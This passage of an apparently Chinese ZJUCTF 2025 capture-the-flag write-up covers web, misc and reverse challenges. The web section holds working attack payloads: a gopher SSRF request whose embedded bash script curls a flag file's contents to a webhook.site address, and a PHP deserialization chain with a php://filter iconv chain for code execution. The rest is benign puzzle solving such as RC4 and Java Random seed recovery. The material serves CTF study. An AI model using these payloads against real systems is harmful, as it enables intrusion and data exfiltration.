class="line">?url=gopher://localhost:3311/_POST%2520%252F%2520HTTP%252F1%252E1%250D%250AHost%253A%2520127%252E0%252E0%252E1%253A3311%250D%250AContent%252DType%253A%2520text%252Fplain%250D%250AContent%252DType%253A%2520application%252Fx%252Dwww%252Dform%252Durlencoded%250D%250AContent%252DLength%253A%2520142%250D%250A%250D%250Acontent%253D%252523%252521%25252Fusr%25252Fbin%25252Fbash%25250Acurl%252B%252509https%25253A%25252F%25252Fwebhook%252Esite%25252Fcc2386bf%252D053e%252D44d0%252D8318%252D0a623b0e8ecc%25252F%252560cat%252B%25252Fflag%252Etxt%25257Cbase64%252560</span><br></pre></td></tr></table></figure>

<p><img src="/2025/11/17/zjuctf2025/5.png" alt="alt text"></p>
<p>然后两条链路一同发包竞争即可</p>
<p>ZJUCTF{K3ss0ku_B4nd_Wa7A5hIWa_HIt0R!_dAK3_9A123DB9}</p>
<h3 id="ezStack"><a href="#ezStack" class="headerlink" title="ezStack"></a>ezStack</h3><p>pop链很简单，进入include后用php_filter_chain_generator即可</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data=O:6:&quot;Logger&quot;:1:&#123;s:7:&quot;handler&quot;;O:7:&quot;Printer&quot;:1:&#123;s:4:&quot;text&quot;;O:4:&quot;File&quot;:1:&#123;s:8:&quot;filename&quot;;s:2373:&quot;php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp&quot;;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data=O:6:&quot;Logger&quot;:1:&#123;s:7:&quot;handler&quot;;O:7:&quot;Printer&quot;:1:&#123;s:4:&quot;text&quot;;O:4:&quot;File&quot;:1:&#123;s:8:&quot;filename&quot;;s:46:&quot;/flag-47BD8938-2BA9-4080-9DD7-E5713E21F7F1.txt&quot;;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>ZJUCTF{WhA7_i$_PeARcMD?_9C0BC4A1}</p>
<h3 id="Time-Paradox"><a href="#Time-Paradox" class="headerlink" title="Time Paradox"></a>Time Paradox</h3><p>下载镜像，用R-studio把FLAG.DCX恢复出来解压即可找到有flag的image.bmp</p>
<p>ZJUCTF{hacking_to_the_game_8921bcd56a80}</p>
<h3 id="As-I’ve-written"><a href="#As-I’ve-written" class="headerlink" title="As I’ve written"></a>As I’ve written</h3><p>index.ejs中这里是 <code>&lt;%- %&gt;</code> 而不是 <code>&lt;%= %&gt;</code>，也就是完全不再做 HTML 转义</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=<span class="string">&quot;content&quot;</span>&gt;</span><br><span class="line">    &lt;%- content %&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure>

<p>nickname会被插入到一篇文章中，但是有DOMPurify</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">content</span>: (mail ? (lang === <span class="string">&#x27;zh&#x27;</span> ? mail.<span class="property">content_zh</span> : mail.<span class="property">content_en</span>) : <span class="string">&quot;邮件不存在&quot;</span>).<span class="title function_">replace</span>(<span class="regexp">/&#123;NICKNAME&#125;/g</span>, purify.<span class="title function_">sanitize</span>(nickname))</span><br></pre></td></tr></table></figure>

<p>“dompurify”: “^3.3.0”</p>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Lab-Report"><a href="#Lab-Report" class="headerlink" title="Lab Report"></a>Lab Report</h3><p>用010editor打开pdf，发现里面有一段交叉引用表</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0 290</span><br><span class="line">0000000000 65535 f </span><br><span class="line">0000000100 00000 n </span><br><span class="line">0000000110 00000 n </span><br><span class="line">0000000130 00000 n </span><br><span class="line">0000000140 00000 n </span><br><span class="line">0000000160 00000 n </span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>取相邻两行偏移的差值，得到一串间隔：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10, 20, 10, 20, 20, 10, 20, 10, 10, 20, ...</span><br></pre></td></tr></table></figure>

<p>很明显10当成0，20当成1，每8位一组转成十进制，再按ASCII解析即可</p>
<p>ZJUCTF{PDF_0ff5e7_c4N_H1D3_m3ss4g3}</p>
<h3 id="macro-magic"><a href="#macro-magic" class="headerlink" title="macro magic"></a>macro magic</h3><p>用变参宏+拼接来实现 <code>data[i]</code> 下标访问，再用 <code>FOR_EACH</code> 风格的递归宏遍历seq，对每个索引输出对应的 <code>data[i]</code></p>
<p>exp</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">#define CAT(a,b) CAT2(a,b)</span><br><span class="line">#define CAT2(a,b) a##b</span><br><span class="line"></span><br><span class="line">#define D0(a) D0_(a)</span><br><span class="line">#define D0_(_0,...) _0</span><br><span class="line">#define D1(a) D1_(a)</span><br><span class="line">#define D1_(_0,_1,...) _1</span><br><span class="line">#define D2(a) D2_(a)</span><br><span class="line">#define D2_(_0,_1,_2,...) _2</span><br><span class="line">#define D3(a) D3_(a)</span><br><span class="line">#define D3_(_0,_1,_2,_3,...) _3</span><br><span class="line">#define D4(a) D4_(a)</span><br><span class="line">#define D4_(_0,_1,_2,_3,_4,...) _4</span><br><span class="line">#define D5(a) D5_(a)</span><br><span class="line">#define D5_(_0,_1,_2,_3,_4,_5,...) _5</span><br><span class="line">#define D6(a) D6_(a)</span><br><span class="line">#define D6_(_0,_1,_2,_3,_4,_5,_6,...) _6</span><br><span class="line">#define D7(a) D7_(a)</span><br><span class="line">#define D7_(_0,_1,_2,_3,_4,_5,_6,_7,...) _7</span><br><span class="line">#define D8(a) D8_(a)</span><br><span class="line">#define D8_(_0,_1,_2,_3,_4,_5,_6,_7,_8,...) _8</span><br><span class="line">#define D9(a) D9_(a)</span><br><span class="line">#define D9_(_0,_1,_2,_3,_4,_5,_6,_7,_8,_9,...) _9</span><br><span class="line"></span><br><span class="line">#define VAL(i) CAT(D,i)(data)</span><br><span class="line"></span><br><span class="line">#define PARENS ()</span><br><span class="line">#define EXPAND(...)  EXPAND4(EXPAND4(EXPAND4(EXPAND4(__VA_ARGS__))))</span><br><span class="line">#define EXPAND4(...) EXPAND3(EXPAND3(EXPAND3(EXPAND3(__VA_ARGS__))))</span><br><span class="line">#define EXPAND3(...) EXPAND2(EXPAND2(EXPAND2(EXPAND2(__VA_ARGS__))))</span><br><span class="line">#define EXPAND2(...) EXPAND1(EXPAND1(EXPAND1(EXPAND1(__VA_ARGS__))))</span><br><span class="line">#define EXPAND1(...) __VA_ARGS__</span><br><span class="line"></span><br><span class="line">#define FOR_EACH(macro, ...) __VA_OPT__(EXPAND(FOR_EACH_HELPER(macro, __VA_ARGS__)))</span><br><span class="line">#define FOR_EACH_HELPER(macro, a1, ...) macro(a1) __VA_OPT__(FOR_EACH_AGAIN PARENS (macro, __VA_ARGS__))</span><br><span class="line">#define FOR_EACH_AGAIN() FOR_EACH_HELPER</span><br><span class="line"></span><br><span class="line">#define OUT(i) VAL(i)</span><br><span class="line"></span><br><span class="line">FOR_EACH(OUT, seq)</span><br></pre></td></tr></table></figure>

<p>ZJUCTF{4c7u411y_c_m4cr05_4r3_n07_7ur1n6_c0mp1373}</p>
<h3 id="bingo"><a href="#bingo" class="headerlink" title="bingo"></a>bingo</h3><p>推了一部分然后硬试，没啥可说的</p>
<p>ZJUCTF{10110_00010_00111_01010_01010}</p>
<h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="hello-reverse"><a href="#hello-reverse" class="headerlink" title="hello-reverse"></a>hello-reverse</h3><p><img src="/2025/11/17/zjuctf2025/1.png" alt="alt text"><br><img src="/2025/11/17/zjuctf2025/2.png" alt="alt text"></p>
<p>ZJUCTF{Hello_Let’s_Reverse_2025🎉}</p>
<h3 id="Thread之歌"><a href="#Thread之歌" class="headerlink" title="Thread之歌"></a>Thread之歌</h3><p>main函数中 <code>sub_1400013A0</code> 被劫持，实际是执行了一个RC4加密</p>
<p>exp.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">key = <span class="string">b&quot;kcabllaC_SLT&quot;</span></span><br><span class="line">cipher = <span class="built_in">bytes</span>([</span><br><span class="line">    <span class="number">0xb6</span>,<span class="number">0x83</span>,<span class="number">0x31</span>,<span class="number">0x0f</span>,<span class="number">0x47</span>,<span class="number">0x13</span>,<span class="number">0x39</span>,<span class="number">0x9f</span>,<span class="number">0xb1</span>,<span class="number">0x74</span>,<span class="number">0xcd</span>,<span class="number">0x6c</span>,</span><br><span class="line">    <span class="number">0x2b</span>,<span class="number">0x0f</span>,<span class="number">0xd1</span>,<span class="number">0xfb</span>,<span class="number">0xc4</span>,<span class="number">0x76</span>,<span class="number">0xa5</span>,<span class="number">0xb9</span>,<span class="number">0xef</span>,<span class="number">0xb3</span>,<span class="number">0x28</span>,<span class="number">0x88</span>,</span><br><span class="line">    <span class="number">0x59</span>,<span class="number">0x0d</span>,<span class="number">0xaf</span>,<span class="number">0x6d</span>,<span class="number">0x4f</span>,<span class="number">0x05</span>,<span class="number">0xa7</span>,<span class="number">0xb5</span>,<span class="number">0xe5</span>,<span class="number">0xdf</span>,<span class="number">0x97</span>,<span class="number">0x94</span></span><br><span class="line">])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_ksa</span>(<span class="params">key: <span class="built_in">bytes</span></span>):</span><br><span class="line">    S = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + S[i] + key[i % <span class="built_in">len</span>(key)]) % <span class="number">256</span></span><br><span class="line">        S[i], S[j] = S[j], S[i]</span><br><span class="line">    <span class="keyword">return</span> S</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_prga</span>(<span class="params">S, n</span>):</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    out = []</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + S[i]) % <span class="number">256</span></span><br><span class="line">        S[i], S[j] = S[j], S[i]</span><br><span class="line">        K = S[(S[i] + S[j]) % <span class="number">256</span>]</span><br><span class="line">        out.append(K)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(out)</span><br><span class="line"></span><br><span class="line">S = rc4_ksa(key)</span><br><span class="line">keystream = rc4_prga(S, <span class="built_in">len</span>(cipher))</span><br><span class="line">flag_bytes = <span class="built_in">bytes</span>(c ^ k <span class="keyword">for</span> c, k <span class="keyword">in</span> <span class="built_in">zip</span>(cipher, keystream))</span><br><span class="line"><span class="built_in">print</span>(flag_bytes)</span><br><span class="line"><span class="built_in">print</span>(flag_bytes.decode())</span><br></pre></td></tr></table></figure>

<p>ZJUCTF{Y0u_4rE_G00d_@_TLS_C4llb4ck!}</p>
<h3 id="Hej"><a href="#Hej" class="headerlink" title="Hej!"></a>Hej!</h3><p>反编译后只有一个 <code>Main.class</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] strArr)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Hej! Välkommen till ZJUCTF 2025!\n\&quot;Hej\&quot; means hello in Swedish.\nGive me your flag and I will check it.&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">nextLine</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in).nextLine();</span><br><span class="line">        <span class="type">byte</span>[] bytes = nextLine.repeat((<span class="number">64</span> / nextLine.length()) + <span class="number">1</span>).substring(<span class="number">0</span>, <span class="number">64</span>).getBytes(StandardCharsets.ISO_8859_1);</span><br><span class="line">        <span class="type">Supplier</span> <span class="variable">supplier</span> <span class="operator">=</span> () -&gt; &#123;</span><br><span class="line">            <span class="type">byte</span>[] bArr = <span class="keyword">new</span> <span class="title class_">byte</span>[bytes.length];</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Random</span>().nextBytes(bArr);</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; bArr.length; i++) &#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">i2</span> <span class="operator">=</span> i;</span><br><span class="line">                bArr[i2] = (<span class="type">byte</span>) (bArr[i2] ^ bytes[i]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> bArr;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;r¶5\u0082\u000fb1ô´ò+\u0006»\u0095k®´TnÛ*\u009dØgúþ&gt;c2é´0G\u0013áÊúÁ|\u001c)\u001eîå3¤\bÞþç\n_\u008a\u0010óíÉ\u0013Áçñb7Q&quot;</span>.equals(</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">String</span>((<span class="type">byte</span>[]) supplier.get(), StandardCharsets.ISO_8859_1))) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Congratulations!&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Could not verify your flag! Possible reasons are:\n1. Your flag is incorrect. Try another one.\n2. The time of verification is incorrect. Try again earlier or later.\nNote: it is reported that the flag must be verified between some second during the competition. The exact second is unknown.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>先把源码里那串常量字符串按ISO_8859_1转成64字节密文C。利用已知前缀 <code>ZJUCTF&#123;</code>，通过 <code>C[i] = R[i] ^ P[i]</code> 反推出前7个随机字节 <code>R[0..6]</code>。</p>
<p>利用Java Random的LCG结构和nextBytes的实现，从 <code>R[0..6]</code> 反推内部种子。用恢复出的种子重放nextBytes得到完整64字节随机序列R，再 <code>P = C ^ R</code> 还原出填充后的明文。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line">A = <span class="number">0x5DEECE66D</span></span><br><span class="line">B = <span class="number">0xB</span></span><br><span class="line">MASK = (<span class="number">1</span> &lt;&lt; <span class="number">48</span>) - <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">next_int</span>(<span class="params">seed</span>):</span><br><span class="line">    seed = (seed * A + B) &amp; MASK</span><br><span class="line">    x = seed &gt;&gt; <span class="number">16</span>  <span class="comment"># 32bits</span></span><br><span class="line">    <span class="keyword">return</span> seed, x &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_bytes_from_seed</span>(<span class="params">seed, nbytes</span>):</span><br><span class="line">    state = seed</span><br><span class="line">    out = []</span><br><span class="line">    rnd = <span class="number">0</span></span><br><span class="line">    remaining = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(nbytes):</span><br><span class="line">        <span class="keyword">if</span> remaining == <span class="number">0</span>:</span><br><span class="line">            state, rnd = next_int(state)</span><br><span class="line">            remaining = <span class="number">4</span></span><br><span class="line">        out.append(rnd &amp; <span class="number">0xFF</span>)</span><br><span class="line">        rnd &gt;&gt;= <span class="number">8</span></span><br><span class="line">        remaining -= <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> state, <span class="built_in">bytes</span>(out)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    cipher_str = <span class="string">&quot;r¶5\u0082\u000fb1ô´ò+\u0006»\u0095k®´TnÛ*\u009dØgúþ&gt;c2é´0G\u0013áÊúÁ|\u001c)\u001eîå3¤\bÞþç\n_\u008a\u0010óíÉ\u0013Áçñb7Q&quot;</span></span><br><span class="line">    cipher = cipher_str.encode(<span class="string">&quot;latin-1&quot;</span>)  <span class="comment"># 对应 Java 的 ISO_8859_1</span></span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(cipher) == <span class="number">64</span></span><br><span class="line"></span><br><span class="line">    prefix = <span class="string">b&quot;ZJUCTF&#123;&quot;</span></span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(prefix) == <span class="number">7</span></span><br><span class="line"></span><br><span class="line">    R_known = [cipher[i] ^ prefix[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(prefix))]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] R[0..6] =&quot;</span>, R_known)</span><br><span class="line"></span><br><span class="line">    x0 = (</span><br><span class="line">        R_known[<span class="number">0</span>]</span><br><span class="line">        | (R_known[<span class="number">1</span>] &lt;&lt; <span class="number">8</span>)</span><br><span class="line">        | (R_known[<span class="number">2</span>] &lt;&lt; <span class="number">16</span>)</span><br><span class="line">        | (R_known[<span class="number">3</span>] &lt;&lt; <span class="number">24</span>)</span><br><span class="line">    ) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line"></span><br><span class="line">    x1_low24 = (</span><br><span class="line">        R_known[<span class="number">4</span>]</span><br><span class="line">        | (R_known[<span class="number">5</span>] &lt;&lt; <span class="number">8</span>)</span><br><span class="line">        | (R_known[<span class="number">6</span>] &lt;&lt; <span class="number">16</span>)</span><br><span class="line">    ) &amp; <span class="number">0xFFFFFF</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] x0       = 0x%08X&quot;</span> % x0)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] x1_low24 = 0x%06X&quot;</span> % x1_low24)</span><br><span class="line"></span><br><span class="line">    candidates = []</span><br><span class="line">    <span class="keyword">for</span> high8 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        x1 = x1_low24 | (high8 &lt;&lt; <span class="number">24</span>)</span><br><span class="line">        <span class="keyword">for</span> low16 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span> &lt;&lt; <span class="number">16</span>):</span><br><span class="line">            seed1 = ((x0 &amp; <span class="number">0xFFFFFFFF</span>) &lt;&lt; <span class="number">16</span>) | low16</span><br><span class="line">            seed2 = (seed1 * A + B) &amp; MASK</span><br><span class="line">            <span class="keyword">if</span> (seed2 &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFFFFFFFF</span> == x1:</span><br><span class="line">                candidates.append((seed1, x1))</span><br><span class="line">        <span class="keyword">if</span> candidates:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[+] Found candidate(s) with high8 = %d&quot;</span> % high8)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> candidates:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] No seed1 found, something is wrong.&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] #candidates =&quot;</span>, <span class="built_in">len</span>(candidates))</span><br><span class="line"></span><br><span class="line">    A_inv = <span class="built_in">pow</span>(A, -<span class="number">1</span>, <span class="number">1</span> &lt;&lt; <span class="number">48</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> seed1, x1 <span class="keyword">in</span> candidates:</span><br><span class="line">        seed0 = ((seed1 - B) * A_inv) &amp; MASK</span><br><span class="line">        _, R_full = gen_bytes_from_seed(seed0, <span class="number">64</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">list</span>(R_full[:<span class="number">7</span>]) == R_known:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[+] Found correct seed0 = 0x%012X&quot;</span> % seed0)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] No seed0 matches R[0..6]&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    _, R_full = gen_bytes_from_seed(seed0, <span class="number">64</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] R_full[0..15] =&quot;</span>, <span class="built_in">list</span>(R_full[:<span class="number">16</span>]))</span><br><span class="line"></span><br><span class="line">    plain = <span class="built_in">bytes</span>([c ^ r <span class="keyword">for</span> (c, r) <span class="keyword">in</span> <span class="built_in">zip</span>(cipher, R_full)])</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Plain (latin-1) =&quot;</span>, plain.decode(<span class="string">&quot;latin-1&quot;</span>, errors=<span class="string">&quot;replace&quot;</span>))</span><br><span class="line"></span><br><span class="line">    s = plain.decode(<span class="string">&quot;latin-1&quot;</span>, errors=<span class="string">&quot;replace&quot;</span>)</span><br><span class="line">    end = s.find(<span class="string">&quot;&#125;&quot;</span>) + <span class="number">1</span></span><br><span class="line">    flag = s[:end]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] flag =&quot;</span>, flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>ZJUCTF{hej_is_hello_java}</p>
<h3 id="happyhap"><a href="#happyhap" class="headerlink" title="happyhap"></a>happyhap</h3><p>解包后关注modules.abc和libentry.so就行</p>
<p>exp.py</p>
